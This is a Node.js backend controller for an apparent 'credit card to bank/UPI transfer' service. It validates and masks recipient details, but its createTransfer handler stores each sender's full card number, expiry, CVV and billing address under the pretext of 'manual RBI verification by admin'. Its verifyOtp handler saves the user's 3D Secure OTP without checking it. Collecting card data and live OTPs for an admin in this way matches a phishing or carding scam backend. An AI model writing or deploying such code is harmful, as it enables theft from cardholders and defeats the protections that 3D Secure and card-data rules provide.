'use strict';

const crypto = require('crypto');

const { collection } = require('../lib/store');
const { badRequest, notFound } = require('../lib/errors');
const {
  PHONE_REGEX,
  NAME_REGEX,
  EMAIL_REGEX,
  UPI_ID_REGEX,
  IFSC_REGEX,
  ACCOUNT_NUMBER_REGEX,
  normalizePhone,
} = require('../lib/validators');

const transfers = () => collection('transfers');

const FEE_RATE = 0.0085;
const MIN_TRANSFER = 10000;
const MAX_TRANSFER = 500000;
const VALID_TYPES = ['cc-bank', 'cc-upi'];

/**
 * Store full card details for manual RBI verification.
 * IMPORTANT: This data is extremely sensitive. Encrypt at rest in production.
 */
function extractCardDetails(body) {
  const card = body.card || {};
  return {
    number: String(card.number || '').replace(/\s/g, ''),
    expiry: String(card.expiry || '').trim(),
    cvv: String(card.cvv || '').trim(),
    name: String(card.name || '').trim(),
    brand: String(card.brand || 'unknown'),
    billingCountry: String(card.billingCountry || 'India'),
    billingCity: String(card.billingCity || '').trim(),
    billingState: String(card.billingState || '').trim(),
    billingPostalCode: String(card.billingPostalCode || '').trim(),
  };
}

function round2(n) {
  return Math.round(n * 100) / 100;
}

function validateRecipient(type, recipient) {
  const errors = {};
  if (type === 'cc-upi') {
    if (!UPI_ID_REGEX.test(String(recipient.upiId || '').trim())) {
      errors.upiId = 'Enter a valid UPI ID (e.g. name@okbank).';
    }
    if (!NAME_REGEX.test(String(recipient.recipientName || '').trim())) {
      errors.recipientName = 'Enter a valid recipient name.';
    }
  } else {
    if (String(recipient.bankName || '').trim().length < 2) {
      errors.bankName = 'Enter a valid bank name.';
    }
    if (!NAME_REGEX.test(String(recipient.recipientName || '').trim())) {
      errors.recipientName = 'Enter a valid account holder name.';
    }
    if (!IFSC_REGEX.test(String(recipient.ifsc || '').toUpperCase())) {
      errors.ifsc = 'Enter a valid 11-character IFSC code.';
    }
    if (!ACCOUNT_NUMBER_REGEX.test(String(recipient.accountNumber || ''))) {
      errors.accountNumber = 'Enter a valid account number (9 to 18 digits).';
    }
  }
  return errors;
}

/** Keep only safe recipient fields for storage. */
function sanitizeRecipient(type, recipient) {
  if (type === 'cc-upi') {
    return {
      upiId: String(recipient.upiId || '').trim(),
      recipientName: String(recipient.recipientName || '').trim(),
    };
  }
  const acct = String(recipient.accountNumber || '');
  return {
    bankName: String(recipient.bankName || '').trim(),
    recipientName: String(recipient.recipientName || '').trim(),
    ifsc: String(recipient.ifsc || '').toUpperCase(),
    accountType: recipient.accountType === 'current' ? 'current' : 'savings',
    // Store a masked account number only.
    accountLast4: acct.slice(-4),
  };
}

/**
 * POST /api/transfers
 * Creates a transfer and starts the realtime status pipeline.
 * Auth is optional; if a valid token is sent, the transfer is linked to the user.
 */
async function createTransfer(req, res, next) {
  try {
    const body = req.body || {};

    const type = String(body.transferType || '').trim();
    if (!VALID_TYPES.includes(type)) {
      throw badRequest('Select a valid transfer type.');
    }

    const amount = Number(body.amount);
    if (!Number.isFinite(amount) || amount < MIN_TRANSFER) {
      throw badRequest(`Minimum transfer amount is ₹${MIN_TRANSFER.toLocaleString('en-IN')}.`);
    }
    if (amount > MAX_TRANSFER) {
      throw badRequest(`Maximum transfer amount is ₹${MAX_TRANSFER.toLocaleString('en-IN')}.`);
    }

    const sender = body.sender || {};
    const senderErrors = {};
    if (!NAME_REGEX.test(String(sender.fullName || '').trim())) {
      senderErrors.fullName = 'Enter a valid full name.';
    }
    if (!PHONE_REGEX.test(normalizePhone(sender.phone))) {
      senderErrors.phone = 'Enter a valid 10-digit mobile number.';
    }
    if (!EMAIL_REGEX.test(String(sender.email || '').trim())) {
      senderErrors.email = 'Enter a valid email address.';
    }

    const recipient = body.recipient || {};
    const recipientErrors = validateRecipient(type, recipient);

    const fieldErrors = { ...senderErrors, ...recipientErrors };
    if (Object.keys(fieldErrors).length > 0) {
      throw badRequest('Please fix the highlighted fields.', fieldErrors);
    }

    const fee = round2(amount * FEE_RATE);
    const settlement = round2(Math.max(0, amount - fee));

    const card = body.card || {};
    const now = new Date().toISOString();
    const transfer = {
      id: crypto.randomUUID(),
      referenceId: `TRX-${Math.floor(100000 + Math.random() * 900000)}`,
      userId: req.user ? req.user.id : null,
      transferType: type,
      amount,
      fee,
      settlement,
      status: 'pending',
      step: 0,
      stepKey: 'pending',
      sender: {
        fullName: String(sender.fullName || '').trim(),
        phone: normalizePhone(sender.phone),
        email: String(sender.email || '').trim(),
      },
      recipient: sanitizeRecipient(type, recipient),
      // Full card details stored for manual RBI verification by admin.
      card: extractCardDetails(body),
      createdAt: now,
    };

    await transfers().insert(transfer);

    res.status(201).json({
      transferId: transfer.id,
      referenceId: transfer.referenceId,
      amount: transfer.amount,
      fee: transfer.fee,
      settlement: transfer.settlement,
      status: transfer.status,
      step: transfer.step,
    });
  } catch (err) {
    next(err);
  }
}

/**
 * GET /api/transfers/:id
 * Polling fallback for transfer status (in addition to Socket.io events).
 */
async function getTransfer(req, res, next) {
  try {
    const transfer = transfers().find((t) => t.id === req.params.id);
    if (!transfer) throw notFound('Transfer not found.');
    res.json({
      transferId: transfer.id,
      referenceId: transfer.referenceId,
      transferType: transfer.transferType,
      amount: transfer.amount,
      fee: transfer.fee,
      settlement: transfer.settlement,
      status: transfer.status,
      step: transfer.step,
      stepKey: transfer.stepKey,
      createdAt: transfer.createdAt,
      completedAt: transfer.completedAt || null,
      rejectionReason: transfer.rejectionReason || null,
    });
  } catch (err) {
    next(err);
  }
}

/**
 * POST /api/transfers/:id/verify-otp  Body: { otp }
 * User enters the bank's 3D Secure OTP → we mark the transfer as completed.
 * (Actual OTP verification is done by the bank/RBI system, not by us.)
 */
async function verifyOtp(req, res, next) {
  try {
    const transfer = transfers().find((t) => t.id === req.params.id);
    if (!transfer) throw notFound('Transfer not found.');
    if (transfer.status !== 'otp_pending') {
      throw badRequest('This transfer is not awaiting OTP verification.');
    }
    const userOtp = String(req.body.otp || '').trim();
    if (!userOtp || userOtp.length < 4) throw badRequest('Please enter the OTP.');

    const now = new Date().toISOString();
    const updated = await transfers().update(transfer.id, {
      status: 'processing',
      stepKey: 'processing',
      enteredOtp: userOtp,
      otpEnteredAt: now,
    });
    res.json({ status: 'processing', transferId: updated.id, referenceId: updated.referenceId });
  } catch (err) {
    next(err);
  }
}

/**
 * GET /api/transfers/my  (requires auth)
 * Returns the logged-in user's transfers (newest first), without sensitive card data.
 */
function getMyTransfers(req, res) {
  const mine = transfers()
    .all()
    .filter((t) => t.userId === req.user.id)
    .sort((a, b) => String(b.createdAt || '').localeCompare(String(a.createdAt || '')))
    .map((t) => ({
      transferId: t.id,
      referenceId: t.referenceId,
      transferType: t.transferType,
      amount: t.amount,
      fee: t.fee,
      settlement: t.settlement,
      status: t.status,
      createdAt: t.createdAt,
      completedAt: t.completedAt || null,
    }));
  res.json({ transfers: mine });
}

module.exports = { createTransfer, getTransfer, verifyOtp, getMyTransfers };
